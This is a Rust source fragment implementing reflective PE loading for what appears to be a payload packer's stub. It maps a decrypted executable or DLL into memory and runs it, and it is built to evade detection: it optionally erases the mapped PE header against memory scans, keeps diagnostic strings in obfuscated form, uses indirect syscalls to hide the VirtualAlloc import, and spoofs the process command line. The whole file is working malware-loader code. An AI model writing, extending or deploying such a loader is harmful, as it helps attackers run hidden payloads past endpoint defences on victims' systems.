// --- Reflective loading (technique fragment) ---

use std::ffi::{c_void, CStr};
use std::ptr;

use windows::Win32::Foundation::{BOOL, HINSTANCE};
use windows::Win32::System::Diagnostics::Debug::{
    IMAGE_DIRECTORY_ENTRY_BASERELOC, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_DIRECTORY_ENTRY_IMPORT,
    IMAGE_DIRECTORY_ENTRY_TLS, IMAGE_FILE_DLL, IMAGE_SECTION_HEADER,
};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
    PAGE_READWRITE,
};
use windows::Win32::System::SystemServices::{
    DLL_PROCESS_ATTACH, IMAGE_BASE_RELOCATION, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE,
    IMAGE_NT_SIGNATURE, IMAGE_REL_BASED_ABSOLUTE, IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_HIGH,
    IMAGE_REL_BASED_HIGHLOW, IMAGE_REL_BASED_LOW, PIMAGE_TLS_CALLBACK,
};
use windows::Win32::System::Threading::GetCurrentProcess;

/// Entry point signature of a mapped EXE (returns the process exit code).
type ExeEntryPoint = unsafe extern "system" fn() -> u32;

/// Entry point signature of a mapped DLL (DllMain).
type DllEntryPoint = unsafe extern "system" fn(HINSTANCE, u32, *mut c_void) -> BOOL;

/// The image's NT headers, for the architecture the stub is built for.
#[cfg(target_arch = "x86_64")]
type NtHeaders = windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
#[cfg(target_arch = "x86")]
type NtHeaders = windows::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;

/// The optional-header magic the payload must have: PE32+ for an x64 stub,
/// PE32 for an x86 one (the packer enforces the same rule at build time).
#[cfg(target_arch = "x86_64")]
const EXPECTED_MAGIC: u16 = 0x20b;
#[cfg(target_arch = "x86")]
const EXPECTED_MAGIC: u16 = 0x10b;

/// Whether to zero the mapped image's PE header before any payload code runs
/// (`params.erase_header`), so a memory scan does not find an `MZ`/`PE` pair at
/// the mapped base. Substituted at build time by `Params::render_fragment`.
const ERASE_HEADER: bool = $ERASE_HEADER$;

/// `IMAGE_TLS_DIRECTORY` for the stub's architecture. The 32-bit layout is
/// defined by hand: the `windows` crate only exposes the 64-bit one, and the
/// field names match it so the callback walk stays shared.
#[cfg(target_arch = "x86_64")]
type TlsDirectory = windows::Win32::System::SystemServices::IMAGE_TLS_DIRECTORY64;
#[cfg(target_arch = "x86")]
#[repr(C)]
#[allow(non_snake_case)]
struct TlsDirectory {
    StartAddressOfRawData: u32,
    EndAddressOfRawData: u32,
    AddressOfIndex: u32,
    AddressOfCallBacks: u32,
    SizeOfZeroFill: u32,
    Characteristics: u32,
}
/// Appends the NTSTATUS to a label (which is rebuilt from obfuscated bytes at
/// the call site, so this literal carries no diagnostic text).
fn nt_error(label: String, status: i32) -> String {
    format!("{label} (0x{:08x})", status as u32)
}

/// Appends a section name to a label (rebuilt from obfuscated bytes at the call
/// site, so this literal carries no diagnostic text).
fn section_error(label: String, section: &str) -> String {
    format!("{label}: {section}")
}

/// A base relocation entry (type + offset packed in a `u16`).
#[repr(C)]
struct BaseRelocationEntry {
    data: u16,
}

impl BaseRelocationEntry {
    fn offset(&self) -> u16 {
        self.data & 0x0FFF
    }

    fn type_(&self) -> u16 {
        self.data >> 12
    }
}

/// Reflectively loads `payload` in the current process and returns the exit
/// code of its entry point.
///
/// When `export` is set (`build.payloads.<name>.export`, only meaningful for
/// `format: dll`), that exported function is called instead of the image's
/// entry point: a mapped DLL's `DllMain` only initializes the library, so a
/// named export is how a DLL payload does real work.
///
/// # Safety
/// `payload` must point to a valid, readable x64 PE image for the whole call.
/// The payload is executed in-process, so its code runs with the stub's
/// privileges.
pub unsafe fn run_reflective(
    payload: &[u8],
    export: Option<&str>,
) -> Result<i32, String> {
    let (_dos, nt) = get_headers(payload)?;
    let is_dll = (*nt).FileHeader.Characteristics.0 & IMAGE_FILE_DLL.0 != 0;
    crate::tech_dbg!(
        "reflective_loading",
        "payload {} bytes (dll={is_dll})",
        payload.len()
    );

    let image_base = allocate_image(nt)?;
    crate::tech_dbg!("reflective_loading", "image mapped at {image_base:p}");
    copy_headers(payload, image_base, nt)?;
    copy_sections(payload, image_base, nt)?;
    crate::tech_dbg!("reflective_loading", "headers and sections copied");
    fix_imports(image_base, nt)?;
    fix_relocations(image_base, nt)?;
    crate::tech_dbg!("reflective_loading", "relocations applied");
    fix_memory_protections(image_base, nt)?;
    crate::tech_dbg!("reflective_loading", "section protections applied");
    // A manually mapped image never gets a TLS index from the OS. Running the
    // payload's `DLL_PROCESS_ATTACH` callbacks initializes its global state;
    // provisioning per-thread TLS is out of scope (see `run_tls_callbacks`).
    run_tls_callbacks(image_base, nt);
    crate::tech_dbg!("reflective_loading", "TLS callbacks executed");

    // Opt-in and last among the loader's own steps: zero the mapped image's PE
    // header before any payload code runs (entry point, `DllMain` or export).
    // Export resolution below reads the payload buffer's header (`nt`) and the
    // export tables inside a section, never the mapped header, so the export
    // path is covered too.
    if ERASE_HEADER {
        erase_mapped_header(image_base, nt);
        crate::tech_dbg!("reflective_loading", "mapped PE header erased");
    }

    if let Some(name) = export {
        // Initialize the library first: a mapped DLL's CRT/global constructors
        // run from `DllMain(DLL_PROCESS_ATTACH)`, which the OS loader would
        // normally call. Skipping it leaves an export that touches the CRT
        // running against uninitialized state.
        if is_dll {
            crate::tech_dbg!("reflective_loading", "running DllMain(DLL_PROCESS_ATTACH)");
            call_dll_main(image_base, nt);
        }
        let address = resolve_export(image_base, nt, name)
            .ok_or_else(|| format!("{}: '{name}'", $MSG_EXPORT_NOT_FOUND$))?;
        crate::tech_dbg!("reflective_loading", "calling export '{name}' at 0x{address:x}");
        call_export(address);
        return Ok(0);
    }

    execute_entrypoint(image_base, nt, is_dll)
}

/// Validates the PE and returns pointers to its DOS and NT headers.
fn get_headers(
    payload: &[u8],
) -> Result<(*const IMAGE_DOS_HEADER, *const NtHeaders), String> {
    if payload.len() < std::mem::size_of::<IMAGE_DOS_HEADER>() {
        return Err($MSG_FILE_TOO_SMALL$);
    }

    unsafe {
        let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
        if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
            return Err($MSG_INVALID_DOS$);
        }

        let nt = (dos as usize + (*dos).e_lfanew as usize) as *const NtHeaders;
        if (*nt).Signature != IMAGE_NT_SIGNATURE {
            return Err($MSG_INVALID_NT$);
        }

        // The packer already rejects a payload whose arch differs from
        // `build.output.arch`, but keep a defensive check here.
        let magic = (*nt).OptionalHeader.Magic.0;
        if magic != EXPECTED_MAGIC {
            return Err(format!("{} (magic 0x{magic:04x})", $MSG_UNSUPPORTED_ARCH$));
        }

        Ok((dos, nt))
    }
}

/// Allocates the image at its preferred base (falling back to any address).
/// The allocation goes through the syscall layer's `nt_alloc_vm`, so
/// `mode: indirect` removes the `VirtualAlloc` import.
fn allocate_image(nt: *const NtHeaders) -> Result<*mut c_void, String> {
    unsafe {
        let size = (*nt).OptionalHeader.SizeOfImage as usize;
        let preferred = (*nt).OptionalHeader.ImageBase as usize;

        let process = GetCurrentProcess();
        let mut base = preferred as *mut c_void;
        let mut region = size;
        let mut status = crate::nt_alloc_vm(
            process,
            &mut base,
            0,
            &mut region,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 {
            base = ptr::null_mut();
            region = size;
            status = crate::nt_alloc_vm(
                process,
                &mut base,
                0,
                &mut region,
                MEM_COMMIT.0 | MEM_RESERVE.0,
                PAGE_READWRITE.0,
            );
        }
        if status < 0 {
            return Err(nt_error($MSG_ALLOCATE_FAILED$, status));
        }

        Ok(base)
    }
}

fn copy_headers(
    payload: &[u8],
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), String> {
    unsafe {
        let size = (*nt).OptionalHeader.SizeOfHeaders as usize;
        ptr::copy_nonoverlapping(payload.as_ptr(), image_base as *mut u8, size);
    }
    Ok(())
}

/// Zeroes the mapped image's PE header (`SizeOfHeaders` bytes at its base).
///
/// The loader reads every later step's metadata from the payload buffer (`nt`),
/// not from the mapped copy, and `copy_headers` left the header pages writable
/// (they are covered by no section, so `fix_memory_protections` never touched
/// them) — a plain `write_bytes` needs no protection change. A payload whose
/// own startup code reads its image's PE header (for example the MSVC CRT) can
/// break, which is why `params.erase_header` is opt-in.
fn erase_mapped_header(image_base: *mut c_void, nt: *const NtHeaders) {
    unsafe {
        let size = (*nt).OptionalHeader.SizeOfHeaders as usize;
        if size > 0 {
            // SAFETY: `image_base` is the image allocated by `allocate_image`
            // and `copy_headers` left the first `SizeOfHeaders` bytes writable.
            ptr::write_bytes(image_base as *mut u8, 0, size);
        }
    }
}

fn copy_sections(
    payload: &[u8],
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), String> {
    unsafe {
        let section_header = (nt as usize + std::mem::size_of::<NtHeaders>())
            as *const IMAGE_SECTION_HEADER;
        let num = (*nt).FileHeader.NumberOfSections as usize;

        for i in 0..num {
            let section = section_header.add(i);
            let raw_size = (*section).SizeOfRawData as usize;
            if raw_size == 0 {
                continue;
            }

            let src = (*section).PointerToRawData as usize;
            let dst = image_base as usize + (*section).VirtualAddress as usize;
            if src + raw_size > payload.len() {
                return Err(section_error(
                    $MSG_SECTION_OUT_OF_BOUNDS$,
                    &section_name(section),
                ));
            }
            ptr::copy_nonoverlapping(payload.as_ptr().add(src), dst as *mut u8, raw_size);
        }
    }
    Ok(())
}

/// Reads a section's (not necessarily NUL-terminated) name.
unsafe fn section_name(section: *const IMAGE_SECTION_HEADER) -> String {
    let name = &(*section).Name;
    let end = name.iter().position(|&b| b == 0).unwrap_or(name.len());
    String::from_utf8_lossy(&name[..end]).into_owned()
}

fn fix_imports(
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), String> {
    unsafe {
        let import_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT.0 as usize];
        if import_dir.Size == 0 || import_dir.VirtualAddress == 0 {
            return Ok(());
        }

        // The mapped image has RVA == offset from `image_base`. `patch_imports`
        // resolves the table, serves catalogue hits from `resolution_policy`,
        // and makes the IAT writable only while it writes (the loader maps it
        // read-only).
        let view = std::slice::from_raw_parts_mut(
            image_base as *mut u8,
            (*nt).OptionalHeader.SizeOfImage as usize,
        );
        let count = crate::patch_imports(
            view,
            import_dir.VirtualAddress,
            import_dir.Size,
            crate::resolution_policy,
        )
        .map_err(|e| e.to_string())?;
        crate::tech_dbg!("reflective_loading", "IAT patched ({count} import(s))");
    }
    Ok(())
}

fn fix_relocations(
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), String> {
    unsafe {
        let reloc_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC.0 as usize];
        if reloc_dir.Size == 0 || reloc_dir.VirtualAddress == 0 {
            return Ok(());
        }

        let preferred = (*nt).OptionalHeader.ImageBase as isize;
        let delta = image_base as isize - preferred;
        if delta == 0 {
            return Ok(());
        }

        let mut block = (image_base as usize + reloc_dir.VirtualAddress as usize)
            as *const IMAGE_BASE_RELOCATION;
        while (*block).VirtualAddress != 0 {
            let block_size = (*block).SizeOfBlock as usize;
            let count = (block_size - std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                / std::mem::size_of::<u16>();
            let entries = (block as usize + std::mem::size_of::<IMAGE_BASE_RELOCATION>())
                as *const BaseRelocationEntry;

            for i in 0..count {
                let entry = entries.add(i);
                let target = (image_base as usize
                    + (*block).VirtualAddress as usize
                    + (*entry).offset() as usize) as *mut isize;

                match (*entry).type_() as u32 {
                    IMAGE_REL_BASED_ABSOLUTE => {}
                    IMAGE_REL_BASED_DIR64 => {
                        *target += delta;
                    }
                    IMAGE_REL_BASED_HIGHLOW => {
                        let target32 = target as *mut u32;
                        *target32 = (*target32 as isize + delta) as u32;
                    }
                    IMAGE_REL_BASED_HIGH => {
                        let target16 = target as *mut u16;
                        *target16 = (*target16 as isize + (delta >> 16)) as u16;
                    }
                    IMAGE_REL_BASED_LOW => {
                        let target16 = target as *mut u16;
                        *target16 = (*target16 as isize + (delta & 0xFFFF)) as u16;
                    }
                    _ => {}
                }
            }

            block = (block as usize + block_size) as *const IMAGE_BASE_RELOCATION;
        }
    }
    Ok(())
}

fn fix_memory_protections(
    image_base: *mut c_void,
    nt: *const NtHeaders,
) -> Result<(), String> {
    unsafe {
        let section_header = (nt as usize + std::mem::size_of::<NtHeaders>())
            as *const IMAGE_SECTION_HEADER;
        let num = (*nt).FileHeader.NumberOfSections as usize;

        for i in 0..num {
            let section = section_header.add(i);
            let characteristics = (*section).Characteristics.0;
            let protection = if characteristics & 0x2000_0000 != 0 {
                // IMAGE_SCN_MEM_EXECUTE
                if characteristics & 0x8000_0000 != 0 {
                    PAGE_EXECUTE_READWRITE
                } else {
                    PAGE_EXECUTE_READ
                }
            } else if characteristics & 0x8000_0000 != 0 {
                PAGE_READWRITE
            } else {
                PAGE_READONLY
            };

            let address =
                (image_base as usize + (*section).VirtualAddress as usize) as *const c_void;
            let size = (*section).Misc.VirtualSize as usize;
            if size > 0 {
                let mut old = 0u32;
                let status = crate::nt_protect_vm(
                    GetCurrentProcess(),
                    address as *mut core::ffi::c_void,
                    size,
                    protection.0,
                    &mut old,
                );
                if status < 0 {
                    return Err(format!(
                        "{}: {} (0x{:08x})",
                        $MSG_VIRTUAL_PROTECT_FAILED$,
                        section_name(section),
                        status as u32
                    ));
                }
            }
        }
    }
    Ok(())
}

/// Runs the payload's `DLL_PROCESS_ATTACH` TLS callbacks, the way the loader
/// would, and nothing more.
///
/// A manually mapped image has no TLS index: the OS never assigns one, and a
/// payload whose CRT relies on `_tls_index` for per-thread state
/// (`thread_local!`, `__declspec(thread)`, the CRT's own per-thread data) is
/// out of scope. Provisioning that state correctly needs the loader's
/// *static*-TLS path (`LdrpHandleTlsData`), not the dynamic `TlsAlloc`/`TlsSetValue`
/// index space; writing a dynamic index into the static
/// `ThreadLocalStoragePointer` array corrupts the heap at thread exit. This
/// mirrors the project's original `void-loader` mapper, which only ran the
/// callbacks and never provisioned a block.
fn run_tls_callbacks(image_base: *mut c_void, nt: *const NtHeaders) {
    unsafe {
        let tls_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS.0 as usize];
        if tls_dir.Size == 0 || tls_dir.VirtualAddress == 0 {
            return;
        }

        let tls =
            (image_base as usize + tls_dir.VirtualAddress as usize) as *const TlsDirectory;
        let callbacks = (*tls).AddressOfCallBacks as *const PIMAGE_TLS_CALLBACK;
        if callbacks.is_null() {
            return;
        }

        let mut i = 0usize;
        while let Some(callback) = *callbacks.add(i) {
            callback(image_base, DLL_PROCESS_ATTACH, ptr::null_mut());
            i += 1;
        }
    }
}

/// Runs the payload's entry point on this thread and returns its exit code.
///
/// The payload keeps the stub's thread rather than getting a fresh one. A
/// payload that calls `ExitProcess` ends the process, exactly as it would from
/// a thread it created itself.
fn execute_entrypoint(
    image_base: *mut c_void,
    nt: *const NtHeaders,
    is_dll: bool,
) -> Result<i32, String> {
    if is_dll {
        crate::tech_dbg!("reflective_loading", "running DllMain(DLL_PROCESS_ATTACH)");
        call_dll_main(image_base, nt);
        return Ok(0);
    }

    let entry_point = image_base as usize + unsafe { (*nt).OptionalHeader.AddressOfEntryPoint } as usize;
    crate::tech_dbg!(
        "reflective_loading",
        "jumping to entry point 0x{entry_point:x}"
    );
    // SAFETY: `entry_point` is the payload's `AddressOfEntryPoint`, copied into
    // executable memory with a matching ABI by the mapping steps above.
    let exe_main: ExeEntryPoint = unsafe { std::mem::transmute(entry_point) };
    let code = unsafe { exe_main() } as i32;
    crate::tech_dbg!("reflective_loading", "payload returned {code}");
    Ok(code)
}

/// The export directory, as laid out in the mapped image. Defined by hand so
/// the fragment does not depend on the `windows` crate exposing it.
#[repr(C)]
struct ExportDirectory {
    characteristics: u32,
    timestamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

/// Resolves an exported symbol by name in an already-mapped image (RVA ==
/// offset from `image_base`).
fn resolve_export(
    image_base: *mut c_void,
    nt: *const NtHeaders,
    wanted: &str,
) -> Option<usize> {
    unsafe {
        let dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize];
        if dir.VirtualAddress == 0 || dir.Size == 0 {
            return None;
        }

        let base = image_base as usize;
        let export = (base + dir.VirtualAddress as usize) as *const ExportDirectory;
        let names = (base + (*export).address_of_names as usize) as *const u32;
        let functions = (base + (*export).address_of_functions as usize) as *const u32;
        let ordinals = (base + (*export).address_of_name_ordinals as usize) as *const u16;

        for i in 0..(*export).number_of_names as usize {
            let name_rva = *names.add(i);
            let name_ptr = (base + name_rva as usize) as *const i8;
            if CStr::from_ptr(name_ptr).to_bytes() == wanted.as_bytes() {
                let ordinal = *ordinals.add(i) as usize;
                return Some(base + *functions.add(ordinal) as usize);
            }
        }
        None
    }
}

/// Calls an exported function that takes no arguments.
fn call_export(address: usize) {
    // SAFETY: `address` is an exported function inside the mapped payload. The
    // export is invoked with no arguments; payloads that need run-time arguments
    // are out of scope (see the technique README).
    let entry: unsafe extern "system" fn() = unsafe { std::mem::transmute(address) };
    unsafe { entry() };
}

/// Runs the mapped DLL's entry point once with `DLL_PROCESS_ATTACH`, the way
/// the loader would, so the payload's CRT and global constructors initialize
/// before an export is called.
fn call_dll_main(image_base: *mut c_void, nt: *const NtHeaders) {
    unsafe {
        let entry = image_base as usize + (*nt).OptionalHeader.AddressOfEntryPoint as usize;
        if entry == image_base as usize {
            return;
        }
        // SAFETY: `entry` is the mapped image's entry point, copied into
        // executable memory with matching ABI (`DllMain`).
        let dll_main: DllEntryPoint = unsafe { std::mem::transmute(entry) };
        let _ = dll_main(
            HINSTANCE(image_base as *mut c_void),
            DLL_PROCESS_ATTACH,
            ptr::null_mut(),
        );
    }
}

/// Adapter expected by the stub skeleton (`run()` calls this with the
/// decrypted payload).
fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    // The payload runs in *this* process and reads its command line from the
    // PEB (`GetCommandLineW`). Repoint it at `<exe> <yaml args> <runtime
    // args>` first, so the payload receives its arguments instead of the
    // stub's own command line (process argument spoofing).
    crate::patch_command_line()?;
    // `build.payloads.<name>.export`: a DLL export to call instead of the entry point.
    let export: Option<String> = $DLL_EXPORT_DEF$;
    // SAFETY: `image` is the decrypted, valid x64 PE produced by the packer.
    unsafe { run_reflective(image, export.as_deref()) }
}
